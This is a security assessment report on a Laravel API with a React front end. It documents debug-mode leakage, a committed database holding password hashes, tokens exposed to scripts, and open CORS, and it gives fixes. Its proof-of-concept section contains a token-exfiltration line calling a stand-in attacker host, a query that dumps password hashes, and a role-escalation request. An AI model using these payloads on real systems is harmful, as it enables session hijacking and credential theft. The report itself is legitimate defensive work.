# Security Assessment Report
## Sensitive Data & Token Exposure — CAPS (Comprehensive Assessment and Preparation System)

**Target:** PHP Laravel 12 REST API + React SPA (Sanctum token auth, MySQL/SQLite, Spatie permissions, nwidart modules)
**Assessment date:** 2026-06-23
**Branch reviewed:** `VulnerabilityPatch`
**Assessor role:** Senior Application Security Analyst
**Scope:** White-box review of `Backend - Deployment/` and `Frontend - Deployment/`

---

## 1. Executive Summary

The engagement was triggered by an observation that authentication tokens and user data are visible in browser developer tools and frontend-accessible storage. I confirmed that observation **and** found that it is one symptom of a broader **Security Misconfiguration + Information Disclosure** posture.

### Direct answer to the core question
> *Does exposing tokens and sensitive data in browser-accessible JSON constitute an Information Disclosure vulnerability?*

**Partly — with an important distinction a senior assessor must make:**

- **Returning the Sanctum bearer token in the `/api/login` JSON body is NOT, by itself, a vulnerability.** It is the standard and *required* delivery mechanism for SPA bearer-token authentication. Seeing it in DevTools → Network is expected.
- **The real vulnerabilities are (a) how the token is *stored* (`sessionStorage`, fully JavaScript-readable, with no Content-Security-Policy), and (b) genuine Information Disclosure elsewhere** — `APP_DEBUG=true` with verbose error bodies, a committed SQLite database containing password hashes, excessive object-property exposure, and permissive CORS.

### Overall Risk Rating: **HIGH**

Not rated *Critical* because several aggravating conditions are absent (password hashes are bcrypt cost-12; tokens carry a 3-hour expiry; the `.env` is **not** committed to git; role-based authorization middleware is functional). The rating is driven by the *combination* of debug-mode info disclosure, secrets/hashes reachable through version control, and XSS-exposed tokens with no CSP.

### Findings at a glance

| # | Finding | OWASP | Severity | Status |
|---|---------|-------|----------|--------|
| F-1 | `APP_DEBUG=true` + verbose `$e->getMessage()` in ~28 files → stack traces, SQL, paths, env leaked in JSON | A05 / API8 | **High** | Confirmed |
| F-2 | SQLite DB `caps_project` committed to git with 4 users incl. bcrypt hashes + `personal_access_tokens` | A02/A05 | **High** | Confirmed |
| F-3 | Bearer token stored in `sessionStorage`; no CSP → XSS = token theft → account takeover | A07/API2 | **High** | Confirmed |
| F-4 | Full `user` Eloquent model returned (login + 5 admin endpoints) → internal identifier disclosure | API3 (BOPLA) | **Medium** | Confirmed |
| F-5 | CORS `allowed_origins:['*']` + `supports_credentials:true`; latent origin-reflecting middleware | A05/API8 | **Medium** | Confirmed |
| F-6 | Secrets in live `.env`: weak DB password, plaintext Gmail app-password (surfaceable via F-1) | A05 | **Medium** | Confirmed |
| F-7 | No Content-Security-Policy anywhere; API responses carry no security headers | A05 | **Medium** | Confirmed |
| F-8 | Self-registration lets the requester pick `roleID`; first registrant can self-assign **Dean** | A01/API5 | **Medium** | Confirmed (mitigated once a Dean exists) |
| F-9 | No API Resource layer — raw models serialized throughout (root cause of F-4) | A04 | **Low** | Confirmed |
| F-10 | `APP_ENV=local` on a production-facing deployment (disables HTTPS scheme forcing, etc.) | A05 | **Medium** | Confirmed |
| F-11 | User/account enumeration on login (pending/inactive) and forgot-password | API3 | **Low** | Confirmed |

### Notable positives (verified, not findings)
- `.env` is correctly git-ignored and absent from history — **no secret leak via VCS**.
- `User` model hides `password` and `remember_token` (`Modules/Users/Models/User.php:51-54`) — **no password-hash leak in API JSON**.
- Password reset uses Laravel's broker correctly — **no reset token leaked in responses**.
- Role-based authorization middleware is wired and functional (`RoleMiddleware`, registered via `config/app.php:170`).
- Bcrypt cost 12; tokens are single-session (old tokens revoked on login) with a 3-hour expiry.

---

## 2. Vulnerability Description

### F-1 — Debug mode + verbose error disclosure *(High)*
**Affected:** `.env:5` (`APP_DEBUG=true`), and explicit leakage in ~28 files, e.g. `Modules/Users/Controllers/AuthController.php:228-230, 315-318`; `Modules/Users/Controllers/UserController.php:183-186, 272-277, 362-368`; `Modules/Users/Controllers/PasswordResetController.php:50-53`.

**Technical explanation.** With `APP_DEBUG=true`, any *unhandled* exception returns Laravel's Whoops/Ignition page — full stack trace, source snippets, absolute file paths, SQL queries, and **environment variables** (which exposes the secrets in F-6). Separately, even *handled* exceptions deliberately return `'error' => $e->getMessage()` in the JSON body, leaking database/SQL error text, constraint names, and internal logic to any client.

**Root cause.** Debug build configuration shipped to a production-facing environment, plus a coding pattern that echoes raw exception messages to API consumers.

### F-2 — Committed SQLite database with password hashes *(High)*
**Affected:** `Backend - Deployment/caps_project` — confirmed `git ls-files` tracked.

**Technical explanation.** The file `caps_project` is a **SQLite 3 database** committed to the repository. It contains application tables including `users` (4 rows, all with bcrypt `$2y$12$…` hashes), `personal_access_tokens`, `roles`, `campuses`, etc. Anyone with repository read access — or anyone who obtains the repo if it is ever made public, forked, or leaked — obtains user PII and offline-crackable password hashes.

**Root cause.** A local/test SQLite database was committed instead of being git-ignored. (These may be seed/test accounts, but committing *any* hash/PII set to VCS is a reportable exposure.)

### F-3 — Token stored in JavaScript-accessible `sessionStorage` *(High)*
**Affected:** backend issues token at `Modules/Users/Controllers/AuthController.php:294-305`; frontend stores it at `src/pages/Login.jsx:62-63` and `src/components/LoginModal.jsx`; read back across 40+ components as `sessionStorage.getItem("token")` → `Authorization: Bearer …`.

**Technical explanation.** The token (and the entire `user` object) live in `sessionStorage`. Any JavaScript executing in the page's origin can read it. Combined with **no Content-Security-Policy** (F-7), a single stored/reflected XSS — or one malicious npm dependency — exfiltrates a valid token and enables full **session hijacking / account takeover**. `sessionStorage` offers zero protection against XSS, which is the relevant threat.

**Root cause.** Browser-accessible token storage with the mitigating control (CSP / HttpOnly cookie transport) absent.

### F-4 — Excessive data exposure: full model serialization *(Medium)*
**Affected:** `AuthController.php:302` (`'user' => $user`); `UserController.php:70, 179, 230, 267, 351`.

**Technical explanation.** These endpoints return the raw Eloquent model. Because `$hidden` covers `password`/`remember_token`, **no credential is leaked** — but internal database identifiers are: `userID` (primary key), `roleID`, `campusID`, `programID`, `status_id`, plus `email`. This is OWASP **API3:2023 Broken Object Property Level Authorization** (formerly "Excessive Data Exposure").

**Root cause.** No response-shaping layer (F-9); the model *is* the API contract.

### F-5 — Permissive CORS *(Medium)*
**Affected:** `config/cors.php:9` (`'allowed_origins' => ['*']`) with `:28` (`'supports_credentials' => true`); latent origin-reflecting `app/Http/Middleware/CorsMiddleware.php:17,27,30`.

**Technical explanation.** The active CORS layer wildcards all origins while claiming credential support — a contradictory, overly trusting configuration. The unused custom `CorsMiddleware` is worse (reflects the caller's `Origin` *and* sets `Allow-Credentials: true`); it is currently dead code but a loaded gun.

**Root cause.** Wildcard CORS used as a "make it work" fix rather than an explicit allow-list.

### F-6 — Secrets in live configuration *(Medium)*
**Affected:** `.env:18-19` (`DB_PASSWORD=CAPSwebsite2025`), `:37` (`MAIL_PASSWORD` plaintext Gmail app password), `:4` (`APP_KEY`). The `.env` is **not** in git (good), but its secrets are weak and **become reachable via F-1** (debug pages render env vars). A leaked Gmail app password enables sending mail as the institution and intercepting password-reset flows.

### F-7 — Missing Content-Security-Policy / API security headers *(Medium)*
**Affected:** no CSP anywhere; no security-header middleware in Laravel. The frontend nginx sets `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, and HSTS (`Frontend - Deployment/nginx.conf`) — good — but **no `Content-Security-Policy`**, the control that would blunt the XSS→token-theft chain in F-3. Backend API responses carry none of these headers.

### F-8 — Privilege escalation via self-selected role at registration *(Medium)*
**Affected:** `AuthController.php:71` (accepts client `roleID`), activation logic `:117-121`.

**Technical explanation.** Registration trusts a client-supplied `roleID`. The branch at line 117 auto-activates any role **not** in `[1,2,3,5]` — i.e., `roleID=4` (**Dean**). The Dean-count guard (`:124-130`) blocks this *once a Dean exists*, so in a seeded production system it is mitigated — but the design permits the **first** registrant to self-provision the highest-privileged account, immediately active.

### F-9 / F-10 / F-11
- **F-9 (Low):** zero `JsonResource` classes exist; controllers serialize models or hand-built arrays ad hoc — the structural root cause of F-4.
- **F-10 (Medium):** `.env:2` `APP_ENV=local` while `FRONTEND_URL`/`SANCTUM_STATEFUL_DOMAINS` point at `caps-test2.coeofjrmsu.com`. `local` skips `URL::forceScheme('https')` and biases other defaults toward insecure.
- **F-11 (Low):** login distinguishes `pending`/`inactive` and echoes `userCode` (`AuthController.php:265-282`); forgot-password reveals registration status (`PasswordResetController.php:41-44`). Both enable account enumeration.

---

## 3. Risk Assessment

| Dimension | Assessment |
|---|---|
| **Confidentiality** | **High.** Debug stack traces (F-1), committed hashes/PII (F-2), token theft (F-3), and identifier over-sharing (F-4) all leak confidential data. |
| **Integrity** | **Medium-High.** A stolen token grants the victim's full privileges; F-8 allows self-escalation in an unseeded system; a compromised mail account (F-6) enables reset-flow account takeover. |
| **Availability** | **Low-Medium.** No direct DoS, but verbose errors aid reconnaissance; bulk admin endpoints could be abused with an elevated token. |
| **Likelihood** | **Medium-High.** F-1/F-4/F-5/F-11 are exploitable today by an unauthenticated user with only a browser. F-3 requires an XSS foothold (raised by no CSP + a large dependency tree). F-2 requires repo access. |

**Aggregate residual risk: HIGH.** The findings are individually contained but mutually reinforcing.

---

## 4. Proof of Concept (attack scenarios)

> Conceptual PoCs for the code owner's authorized remediation testing. No exploitation was performed against any live system.

**PoC A — Information disclosure via debug + error echo (F-1).** Send malformed input that breaks a DB constraint on `/api/register`; with `APP_DEBUG=true` an unhandled path returns a full Ignition trace; handled paths return `{"error":"SQLSTATE[…] …"}`, disclosing schema/query structure.

**PoC B — Token theft → account takeover (F-3 + F-7).** Land any script in the SPA origin → `fetch('https://attacker/c?t='+sessionStorage.getItem('token'))`. No CSP blocks exfiltration. Replay `Authorization: Bearer <token>` for up to 3 hours.

**PoC C — Offline credential recovery (F-2).** Obtain repo access → `sqlite3 caps_project "SELECT email,password FROM users;"` → offline-crack weak/institutional passwords.

**PoC D — Cross-origin response reading (F-5).** A malicious page `fetch`es public endpoints (`/api/roles`, `/api/app-version`) and reads responses because `Access-Control-Allow-Origin: *` is returned.

**PoC E — Self-provisioned Dean (F-8, unseeded env).** `POST /api/register` with `roleID=4` on a system without an existing Dean yields an immediately-active Dean account.

---

## 5. Recommended Mitigations (Laravel-specific)

**F-1 — Disable debug, stop echoing exceptions.**
```dotenv
APP_ENV=production
APP_DEBUG=false
LOG_LEVEL=error
```
Remove every `'error' => $e->getMessage()` from API responses; return a generic message + correlation ID and log details server-side. Centralize in `bootstrap/app.php`:
```php
->withExceptions(function (Exceptions $exceptions) {
    $exceptions->render(function (\Throwable $e, $request) {
        if ($request->is('api/*')) {
            $id = (string) Str::uuid();
            Log::error($id.' '.$e->getMessage(), ['exception' => $e]);
            $status = $e instanceof HttpExceptionInterface ? $e->getStatusCode() : 500;
            return response()->json(['message' => 'An error occurred.', 'ref' => $id], $status);
        }
    });
});
```

**F-2 — Purge the committed database.**
```bash
git rm --cached "Backend - Deployment/caps_project"
printf '\ncaps_project\n*.sqlite\n*.sqlite3\n' >> "Backend - Deployment/.gitignore"
```
Then **rotate every affected credential** and scrub history (`git filter-repo --path "Backend - Deployment/caps_project" --invert-paths`). Treat the 4 hashes as compromised.

**F-3 / F-7 — Reduce token exposure + add CSP.** Prefer Sanctum **SPA cookie mode** (HttpOnly, Secure, SameSite=Lax cookie unreadable by JS). If bearer tokens are retained, add a strict CSP and centralize token attachment in the axios instance (`src/utils/api.js`) via an interceptor:
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'
```
Harden cookies: `SESSION_SECURE_COOKIE=true`, `SESSION_SAME_SITE=lax`.

**F-4 / F-9 — Introduce API Resources.** Return `new UserResource($user)` everywhere instead of `'user' => $user`; expose only id/name/role, never raw PKs/FKs.

**F-5 — Lock CORS to an allow-list.**
```php
'allowed_origins' => [env('FRONTEND_URL', 'https://caps-test2.coeofjrmsu.com')],
'supports_credentials' => true, // valid only with explicit origins, never with '*'
```
Delete the unused `CorsMiddleware.php`.

**F-6 — Secrets hygiene.** Rotate `DB_PASSWORD` to a long random value; rotate/scope the Gmail credential (ideally a transactional provider); rotate `APP_KEY`. Use the deployment platform's secret store.

**F-8 — Server-authoritative roles.** Never accept `roleID` from registration; default to the lowest role; require an authorized admin to assign elevated roles; seed the single Dean via a guarded command.

**F-10 — Correct environment.** `APP_ENV=production` on prod.

**F-11 — Generic responses.** Return a uniform message for login/forgot-password regardless of account state.

---

## 6. Compliance Considerations

**OWASP Top 10 (2021):** A05 Security Misconfiguration (F-1, F-5, F-7, F-10); A02 Cryptographic Failures (F-2, F-3); A01 Broken Access Control (F-8); A07 Identification & Authentication Failures (F-3, F-11); A04 Insecure Design (F-9).

**OWASP API Security Top 10 (2023):** API8 Security Misconfiguration (F-1, F-5, F-7); API3 Broken Object Property Level Authorization (F-4, F-11); API2 Broken Authentication (F-3); API5 Broken Function Level Authorization (F-8).

**Data-privacy (PH Data Privacy Act 2012 / GDPR-equivalent):** Names, emails, and student/instructor identifiers are personal data. F-1/F-2/F-4 represent unauthorized-disclosure exposure; the committed hashes (F-2) could constitute a reportable personal-data incident.

**Secure SDLC:** Add secret-scanning + a pre-commit hook blocking `*.sqlite`/`.env`; a CI gate failing on `APP_DEBUG=true` or wildcard CORS; dependency scanning for the React tree; and a standard that all API output flows through Resources.

---

## 7. Remediation Plan (prioritized)

**Immediate (0-72 h):**
1. F-1: `APP_DEBUG=false`, `APP_ENV=production`; strip `$e->getMessage()` from responses.
2. F-2: `git rm --cached caps_project`, git-ignore it, **rotate the 4 hashed accounts**, plan history scrub.
3. F-6: rotate DB password, Gmail credential, `APP_KEY`.
4. F-5: replace `allowed_origins:['*']` with the explicit frontend origin.

**Short-term (1-3 weeks):**
5. F-7/F-3: deploy strict CSP; centralize token attachment; set `SESSION_SECURE_COOKIE=true`.
6. F-8: make registration roles server-authoritative; seed the Dean via guarded command.
7. F-4/F-9: introduce `UserResource` (and peers); replace `'user' => $user` returns.
8. F-11: genericize auth/forgot-password responses.
9. Purge `caps_project` from git history; rewrite remotes.

**Long-term (1-3 months):**
10. F-3 (strategic): migrate the SPA to Sanctum HttpOnly-cookie session mode; retire `sessionStorage` token handling.
11. Standardize all API output through Resources; add a lint/CI check forbidding raw-model returns.
12. Add CI security gates (secret scanning, debug/CORS assertions, SCA) and a recurring assessment cadence.

---

### Methodology note
All findings are white-box, evidence-backed with `file:line` references, and validated against actual behavior — including ruling out two *potential* findings that turned out to be non-issues (the `.env` is not in git; the `role` middleware is correctly registered via `config/app.php`). The "token appears in the login JSON/Network tab" observation was explicitly **not** flagged as a vulnerability in itself, because for SPA bearer auth that is by design.
